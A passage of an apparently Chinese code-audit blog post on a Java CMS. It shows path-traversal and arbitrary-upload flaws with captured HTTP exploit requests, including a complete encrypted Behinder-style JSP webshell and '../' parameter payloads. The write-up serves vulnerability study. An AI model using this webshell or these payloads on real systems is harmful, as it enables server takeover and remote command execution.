class="line"><span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> getBase(site);</span><br><span class="line"><span class="keyword">if</span> (!Validations.uri(parentId, base)) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">CmsException</span>(<span class="string">&quot;invalidURI&quot;</span>, parentId);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">FileHandler</span> <span class="variable">fileHandler</span> <span class="operator">=</span> getFileHandler(site);</span><br><span class="line">fileHandler.store(file, parentId);</span><br><span class="line">logService.operation(<span class="string">&quot;opr.webFile.upload&quot;</span>, parentId + <span class="string">&quot;/&quot;</span> + file.getOriginalFilename(), <span class="literal">null</span>, <span class="literal">null</span>, request);</span><br><span class="line">logger.info(<span class="string">&quot;upload file, name=&#123;&#125;.&quot;</span>, parentId + <span class="string">&quot;/&quot;</span> + file.getOriginalFilename());</span><br><span class="line">Servlets.writeHtml(response, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​这个函数的大概功能是获取站点信息，验证传入的参数，然后保存文件，再把文件的信息写入日志。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">uri</span><span class="params">(String value, String prefix)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> !StringUtils.contains(value, <span class="string">&quot;..&quot;</span>)</span><br><span class="line">            &amp;&amp; StringUtils.startsWith(value, prefix);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​这里是存在一个过滤的，且过滤了’..’，但是奇怪的是，过滤的parentId而不是文件名，且没有修改文件名，甚至没有对后缀的校验，所以这里是存在任意文件上传和目录穿透的，然后这个项目还会解析JSP，但是需要放到webapp下的JSP文件夹，不过这里还有一个目录穿透所以这就不是问题了，来到前端的功能点。</p><p>​<img src="/img/cs_singlewindow_cms/image-20241209173324471.png" alt="image-20241209173324471"></p><p>​上传文件后抓包，得到如下数据包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cmscp/core/web_file_2/upload.do?_site=1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.227.43:8888</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>2387</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html, */*; q=0.01</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryZzeGAny76zA7fCma</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.227.43:8888</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.227.43:8888/cmscp/core/web_file_2/list.do?parentId=%2F1</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>select_id=%2F1; open_ids=%2F1; _site=1; JSESSIONID=526DEDE9E36FE99249985E52A100BE8E</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-gradle">------WebKitFormBoundaryZzeGAny76zA7fCma</span></span><br><span class="line"><span class="language-gradle">Content-Disposition: form-data; name=<span class="string">&quot;parentId&quot;</span></span></span><br><span class="line"><span class="language-gradle"></span></span><br><span class="line"><span class="language-gradle">/<span class="number">1</span></span></span><br><span class="line"><span class="language-gradle">------WebKitFormBoundaryZzeGAny76zA7fCma</span></span><br><span class="line"><span class="language-gradle">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;shell.jsp&quot;</span></span></span><br><span class="line"><span class="language-gradle">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="language-gradle"></span></span><br><span class="line"><span class="language-gradle">&lt;%@page <span class="keyword">import</span>=<span class="string">&quot;java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*&quot;</span> %&gt;</span></span><br><span class="line"><span class="language-gradle">&lt;%!</span></span><br><span class="line"><span class="language-gradle">    <span class="keyword">private</span> <span class="keyword">byte</span>[] Decrypt(<span class="keyword">byte</span>[] data) <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="language-gradle">    &#123;</span></span><br><span class="line"><span class="language-gradle">        String k=<span class="string">&quot;e45e329feb5d925b&quot;</span>;</span></span><br><span class="line"><span class="language-gradle">        javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(<span class="string">&quot;AES/ECB/PKCS5Padding&quot;</span>);c.init(<span class="number">2</span>,<span class="keyword">new</span> javax.crypto.spec.SecretKeySpec(k.getBytes(),<span class="string">&quot;AES&quot;</span>));</span></span><br><span class="line"><span class="language-gradle">        <span class="keyword">byte</span>[] decodebs;</span></span><br><span class="line"><span class="language-gradle">        <span class="keyword">Class</span> baseCls ;</span></span><br><span class="line"><span class="language-gradle">                <span class="keyword">try</span>&#123;</span></span><br><span class="line"><span class="language-gradle">                    baseCls=<span class="keyword">Class</span>.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span></span><br><span class="line"><span class="language-gradle">                    Object Decoder=baseCls.getMethod(<span class="string">&quot;getDecoder&quot;</span>, <span class="keyword">null</span>).invoke(baseCls, <span class="keyword">null</span>);</span></span><br><span class="line"><span class="language-gradle">                    decodebs=(<span class="keyword">byte</span>[]) Decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, <span class="keyword">new</span> <span class="keyword">Class</span>[]&#123;<span class="keyword">byte</span>[].<span class="keyword">class</span>&#125;).invoke(Decoder, <span class="keyword">new</span> Object[]&#123;data&#125;);</span></span><br><span class="line"><span class="language-gradle">                &#125;</span></span><br><span class="line"><span class="language-gradle">                <span class="keyword">catch</span> (Throwable e)</span></span><br><span class="line"><span class="language-gradle">                &#123;</span></span><br><span class="line"><span class="language-gradle">                    baseCls = <span class="keyword">Class</span>.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);</span></span><br><span class="line"><span class="language-gradle">                    Object Decoder=baseCls.newInstance();</span></span><br><span class="line"><span class="language-gradle">                    decodebs=(<span class="keyword">byte</span>[]) Decoder.getClass().getMethod(<span class="string">&quot;decodeBuffer&quot;</span>,<span class="keyword">new</span> <span class="keyword">Class</span>[]&#123;String.<span class="keyword">class</span>&#125;).invoke(Decoder, <span class="keyword">new</span> Object[]&#123;<span class="keyword">new</span> String(data)&#125;);</span></span><br><span class="line"><span class="language-gradle"></span></span><br><span class="line"><span class="language-gradle">                &#125;</span></span><br><span class="line"><span class="language-gradle">        <span class="keyword">return</span> c.doFinal(decodebs);</span></span><br><span class="line"><span class="language-gradle"></span></span><br><span class="line"><span class="language-gradle">    &#125;</span></span><br><span class="line"><span class="language-gradle">%&gt;</span></span><br><span class="line"><span class="language-gradle">&lt;%!<span class="keyword">class</span> U <span class="keyword">extends</span> ClassLoader&#123;U(ClassLoader c)&#123;<span class="keyword">super</span>(c);&#125;<span class="keyword">public</span> <span class="keyword">Class</span> g(<span class="keyword">byte</span> []b)&#123;<span class="keyword">return</span></span></span><br><span class="line"><span class="language-gradle">        <span class="keyword">super</span>.defineClass(b,<span class="number">0</span>,b.length);&#125;&#125;%&gt;&lt;%<span class="keyword">if</span> (request.getMethod().equals(<span class="string">&quot;POST&quot;</span>))&#123;</span></span><br><span class="line"><span class="language-gradle">            ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span></span><br><span class="line"><span class="language-gradle">            <span class="keyword">byte</span>[] buf = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">512</span>];</span></span><br><span class="line"><span class="language-gradle">            <span class="keyword">int</span> length=request.getInputStream().<span class="keyword">read</span>(buf);</span></span><br><span class="line"><span class="language-gradle">            <span class="keyword">while</span> (length&gt;<span class="number">0</span>)</span></span><br><span class="line"><span class="language-gradle">            &#123;</span></span><br><span class="line"><span class="language-gradle">                <span class="keyword">byte</span>[] data= Arrays.copyOfRange(buf,<span class="number">0</span>,length);</span></span><br><span class="line"><span class="language-gradle">                bos.<span class="keyword">write</span>(data);</span></span><br><span class="line"><span class="language-gradle">                length=request.getInputStream().<span class="keyword">read</span>(buf);</span></span><br><span class="line"><span class="language-gradle">            &#125;</span></span><br><span class="line"><span class="language-gradle">            <span class="comment">/* 取消如下代码的注释，可避免response.getOutputstream报错信息，增加某些深度定制的Java web系统的兼容性</span></span></span><br><span class="line"><span class="comment"><span class="language-gradle">            out.clear();</span></span></span><br><span class="line"><span class="comment"><span class="language-gradle">            out=pageContext.pushBody();</span></span></span><br><span class="line"><span class="comment"><span class="language-gradle">            */</span></span></span><br><span class="line"><span class="language-gradle">            out.clear();</span></span><br><span class="line"><span class="language-gradle">            out=pageContext.pushBody();</span></span><br><span class="line"><span class="language-gradle">        <span class="keyword">new</span> U(<span class="keyword">this</span>.getClass().getClassLoader()).g(Decrypt(bos.toByteArray())).newInstance().equals(pageContext);&#125;</span></span><br><span class="line"><span class="language-gradle">%&gt;</span></span><br><span class="line"><span class="language-gradle">------WebKitFormBoundaryZzeGAny76zA7fCma--</span></span><br><span class="line"><span class="language-gradle"></span></span><br></pre></td></tr></table></figure><p>​修改文件名为..&#x2F;..&#x2F;jsp&#x2F;shell.jsp，之后我们访问<a href="http://192.168.227.43:8888/shell.jsp">192.168.227.43:8888&#x2F;shell.jsp</a>，会发现没有提示404也就是传马成功了，我们使用冰蝎链接，并输入calc命令弹出计算机，可见命令成功执行。</p><p><img src="/img/cs_singlewindow_cms/image-20241209173729074.png" alt="image-20241209173729074"></p><h5 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h5><p>控制器：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequiresPermissions(&quot;core:web_file_2:zip_download&quot;)</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;zip_download.do&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">zipDownload</span><span class="params">(HttpServletRequest request, HttpServletResponse response, RedirectAttributes ra)</span></span><br><span class="line"><span class="keyword">throws</span> IOException &#123;</span><br><span class="line"><span class="built_in">super</span>.zipDownload(request, response, ra);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>压缩下载实现函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">zipDownload</span><span class="params">(HttpServletRequest request, HttpServletResponse response, RedirectAttributes ra)</span></span><br><span class="line"><span class="keyword">throws</span> IOException &#123;</span><br><span class="line"><span class="type">Site</span> <span class="variable">site</span> <span class="operator">=</span> Context.getCurrentSite();</span><br><span class="line"><span class="type">FileHandler</span> <span class="variable">fileHandler</span> <span class="operator">=</span> getFileHandler(site);</span><br><span class="line"><span class="keyword">if</span> (!(fileHandler <span class="keyword">instanceof</span> LocalFileHandler)) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">CmsException</span>(<span class="string">&quot;ftp cannot support ZIP.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">LocalFileHandler</span> <span class="variable">localFileHandler</span> <span class="operator">=</span> (LocalFileHandler) fileHandler;</span><br><span class="line"></span><br><span class="line">String[] ids = Servlets.getParamValues(request, <span class="string">&quot;ids&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> getBase(site);</span><br><span class="line"></span><br><span class="line">File[] files = <span class="keyword">new</span> <span class="title class_">File</span>[ids.length];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>, len = ids.length; i &lt; len; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (!Validations.uri(ids[i], base)) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">CmsException</span>(<span class="string">&quot;invalidURI&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">files[i] = localFileHandler.getFile(ids[i]);</span><br><span class="line">&#125;</span><br><span class="line">response.setContentType(<span class="string">&quot;application/x-download;charset=UTF-8&quot;</span>);</span><br><span class="line">response.addHeader(<span class="string">&quot;Content-disposition&quot;</span>, <span class="string">&quot;filename=download_files.zip&quot;</span>);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">AntZipUtils.zip(files, response.getOutputStream());</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">logger.error(<span class="string">&quot;zip error!&quot;</span>, e);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​这段代码的核心功能就是从请求获取所有的文件，然后遍历这些文件，打包到压缩包里边。分析得出在这一部分检测了文件名的’..’所以这里是不存在任意文件下载的。</p><h5 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h5><p>控制器：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequiresPermissions(&quot;core:web_file_2:mkdir&quot;)</span></span><br><span class="line"><span class="meta">@RequestMapping(value = &quot;mkdir.do&quot;, method = RequestMethod.POST)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">mkdir</span><span class="params">(String parentId, String dir, HttpServletRequest request, HttpServletResponse response,</span></span><br><span class="line"><span class="params">RedirectAttributes ra)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">super</span>.mkdir(parentId, dir, request, response, ra);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>功能实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> String <span class="title function_">mkdir</span><span class="params">(String parentId, String dir, HttpServletRequest request, HttpServletResponse response,</span></span><br><span class="line"><span class="params">RedirectAttributes ra)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"><span class="type">Site</span> <span class="variable">site</span> <span class="operator">=</span> Context.getCurrentSite();</span><br><span class="line">parentId = parentId == <span class="literal">null</span> ? <span class="string">&quot;&quot;</span> : parentId;</span><br><span class="line"><span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> getBase(site);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (StringUtils.isBlank(parentId)) &#123;</span><br><span class="line">parentId = base;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!Validations.uri(parentId, base)) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">CmsException</span>(<span class="string">&quot;invalidURI&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">FileHandler</span> <span class="variable">fileHandler</span> <span class="operator">=</span> getFileHandler(site);</span><br><span class="line"><span class="type">boolean</span> <span class="variable">success</span> <span class="operator">=</span> fileHandler.mkdir(dir, parentId);</span><br><span class="line"><span class="keyword">if</span> (success) &#123;</span><br><span class="line">logService.operation(<span class="string">&quot;opr.role.add&quot;</span>, parentId + <span class="string">&quot;/&quot;</span> + dir, <span class="literal">null</span>, <span class="literal">null</span>, request);</span><br><span class="line">logger.info(<span class="string">&quot;mkdir file, name=&#123;&#125;.&quot;</span>, parentId + <span class="string">&quot;/&quot;</span> + dir);</span><br><span class="line">&#125;</span><br><span class="line">ra.addFlashAttribute(<span class="string">&quot;refreshLeft&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">ra.addAttribute(<span class="string">&quot;parentId&quot;</span>, parentId);</span><br><span class="line">ra.addFlashAttribute(MESSAGE, success ? OPERATION_SUCCESS : OPERATION_FAILURE);</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;redirect:list.do&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​这个代码是在上传文件中的新建文件夹中，经过审计我发现，这里虽存在拦截，但是拦截的对象是parentId。而dir未被拦截，所以我们可以构造如下的数据包。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cmscp/core/web_file_2/mkdir.do</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.21.87.148:8888</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>25</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://172.21.87.148:8888</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://172.21.87.148:8888/cmscp/core/web_file_2/list.do</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>select_id=%2F1; open_ids=%2F1; _site=1; JSESSIONID=CA7DD070F74CFE10991C0475CE82606D</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-awk">parentId=%<span class="number">2</span>F1&amp;dir=..<span class="regexp">/../</span>..<span class="regexp">/../</span>../test</span></span><br></pre></td></tr></table></figure><p>​就可以实现在项目的根路径下创建一个test文件夹。</p><p><img src="/img/cs_singlewindow_cms/image-20241210114831516.png" alt="image-20241210114831516"></p><p>控制器：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequiresPermissions(&quot;core:web_file_2:save&quot;)</span></span><br><span class="line"><span class="meta">@RequestMapping(value = &quot;save.do&quot;, method = RequestMethod.POST)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">save</span><span class="params">(String parentId, String name, String text, String redirect, HttpServletRequest request,</span></span><br><span class="line"><span class="params">HttpServletResponse response, RedirectAttributes ra)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">super</span>.save(parentId, name, text, redirect, request, response, ra);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>功能实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> String <span class="title function_">save</span><span class="params">(String parentId, String name, String text, String redirect, HttpServletRequest request,</span></span><br><span class="line"><span class="params">HttpServletResponse response, RedirectAttributes ra)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"><span class="type">Site</span> <span class="variable">site</span> <span class="operator">=</span> Context.getCurrentSite();</span><br><span class="line"><span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> getBase(site);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!Validations.uri(parentId, base)) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">CmsException</span>(<span class="string">&quot;invalidURI&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">FileHandler</span> <span class="variable">fileHandler</span> <span class="operator">=</span> getFileHandler(site);</span><br><span class="line">fileHandler.store(text, name, parentId);</span><br><span class="line">logService.operation(<span class="string">&quot;opr.webFile.add&quot;</span>, parentId + <span class="string">&quot;/&quot;</span> + name, <span class="literal">null</span>, <span class="literal">null</span>, request);</span><br><span class="line">logger.info(<span class="string">&quot;save file, name=&#123;&#125;.&quot;</span>, parentId + <span class="string">&quot;/&quot;</span> + name);</span><br><span class="line">ra.addFlashAttribute(<span class="string">&quot;refreshLeft&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">ra.addAttribute(<span class="string">&quot;parentId&quot;</span>, parentId);</span><br><span class="line">ra.addFlashAttribute(MESSAGE, SAVE_SUCCESS);</span><br><span class="line"><span class="keyword">if</span> (Constants.REDIRECT_LIST.equals(redirect)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;redirect:list.do&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Constants.REDIRECT_CREATE.equals(redirect)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;redirect:create.do&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">ra.addAttribute(<span class="string">&quot;id&quot;</span>, parentId + <span class="string">&quot;/&quot;</span> + name);</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;redirect:edit.do&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​这里也是同样的漏洞，仅过滤了parentId而没有过滤name参数，所以这里也有目录穿透，新建一个文档，输入success，然后抓包。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cmscp/core/web_file_2/save.do</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.21.87.148:8888</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>89</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://172.21.87.148:8888</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://172.21.87.148:8888/cmscp/core/web_file_2/create.do?parentId=%2F1&amp;</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>select_id=%2F1; open_ids=%2F1; _site=1; JSESSIONID=CA7DD070F74CFE10991C0475CE82606D</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-dts">origN<span class="attr">ame</span><span class="operator">=</span><span class="variable">&amp;</span>parentId=%<span class="number">2F</span>1<span class="variable">&amp;position</span>=<span class="variable">&amp;redirect</span>=edit<span class="variable">&amp;name</span>=test.html<span class="variable">&amp;</span>baseN<span class="attr">ame</span><span class="operator">=</span>test<span class="variable">&amp;text</span>=success</span></span><br></pre></td></tr></table></figure><p>​将name参数修改为..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;test.html即可在项目根目录下创建一个test.html文件。</p><p><img src="/img/cs_singlewindow_cms/image-20241210121816150.png" alt="image-20241210121816150"></p><p>​不仅如此，我们还发现他也没有对后缀进行任何的过滤，因此，我们可以尝试直接写一个马上去，而且这里甚至不需要使用目录穿透，因为他没有对文件内容进行过滤，所以我们可以直接在jsp文件夹里边写马，如下：</p><p><img src="/img/cs_singlewindow_cms/image-20241210192127345.png" alt="image-20241210192127345"></p><p>​冰蝎链接后执行命令：</p><p><img src="/img/cs_singlewindow_cms/image-20241210192255646.png" alt="image-20241210192255646"></p><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>​经过审计和前端测试，该项目也是存在多个XSS，所以这里只拿出一个较有价值的反射型XSS。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 